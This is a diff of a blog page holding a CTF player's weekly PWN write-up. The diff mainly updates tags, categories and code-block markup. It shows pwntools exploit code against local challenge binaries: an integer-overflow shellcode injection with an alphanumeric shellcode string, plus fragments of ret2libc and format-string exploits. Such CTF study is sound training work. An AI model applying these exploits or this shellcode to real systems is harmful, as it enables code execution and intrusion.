@@ -5,9 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Week 2, PWN,linux等">
-    <meta name="description" content="HGAME PWNezshellcode存在整数溢出，unsigned v4,输入-1，然后给一个shellcode
-找一个shellcode放里面
-shellcode来源：https://blog.csdn.net/mcmuyanga/a">
+    <meta name="description" content="第二周周报">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -365,12 +363,25 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PWN/">
+                                <span class="chip bg-color">PWN</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/PWN/" class="post-category">
+                                PWN
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -388,7 +399,7 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    435
+                    433
                 </div>
                 
 
@@ -412,25 +423,23 @@ shellcode来源：https://blog.csdn.net/mcmuyanga/a">
 <p>找一个shellcode放里面</p>
 <p>shellcode来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/114828207">https://blog.csdn.net/mcmuyanga/article/details/114828207</a></p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import*
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import*
 
 context(log_level='debug',arch='amd64',os='linux')
 p=process('./ezshellcode')
 
 p.sendlineafter("of your shellcode:",b'-1')
 
-shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H
-0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1
-n0J0h0a070t"
+shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
 
 p.sendafter("input your shellcode:",shellcode)
 
-p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>猜中99个随机数之后有个read的栈溢出，然后就是基础的ret2libc</p>
 <p>使用ctypes调用链接库的函数，通过创建cdll.LoadLibary来找出随机数</p>
 <p>进入myread函数之后通过read函数与动态链接库，写一个ret2libc</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 from ctypes import *
 
 context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
@@ -483,7 +492,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <h1 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h1><p>hgame的fmt没打通，就又找了一道格式化字符串的题</p>
 <p>先gdb动调计算出偏移量4，找libc中的printf的got表，system的plt，加上个主函数</p>
 <p>修改fini，重新走一遍程序，使用fmtstr把system换上去</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(log_level='debug',arch='i386', os='linux')
 
 p = process('./pwn')
@@ -570,7 +579,11 @@ io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/PWN/">
+                                    <span class="chip bg-color">PWN</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -776,13 +789,21 @@ gitment.render('gitment-content');
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Markdown/" class="post-category">
-                                    Markdown
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
                                 </a>
                             
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -806,7 +827,7 @@ gitment.render('gitment-content');
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            一只菜鸡pwn手的做题记录
                         
                     </div>
                     <div class="publish-info">
@@ -817,13 +838,21 @@ gitment.render('gitment-content');
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Markdown/" class="post-category">
-                                    Markdown
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
                                 </a>
                             
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
